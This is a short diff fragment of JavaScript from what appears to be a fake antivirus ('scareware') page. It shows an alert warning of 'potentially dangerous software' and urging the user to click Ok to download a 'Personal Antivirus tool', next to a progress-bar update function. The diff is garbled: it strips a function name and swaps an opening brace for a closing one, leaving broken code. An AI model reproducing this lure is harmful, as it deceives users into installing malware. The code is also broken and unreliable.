@@ -14,13 +14,13 @@ Text Command------
 
 
 
-function emilion(){
+{
 alert('Potentially dangerous software. These programs may damage your computer and steal your private information. Online Security Checker needs Personal Antivirus components to repair your computer. Please click Ok to download and install Personal Antivirus tool. ');
 }
 function update()
 {
  if ($(".progress_bar_fill").width()>0)
- {
+ }
 
 
 
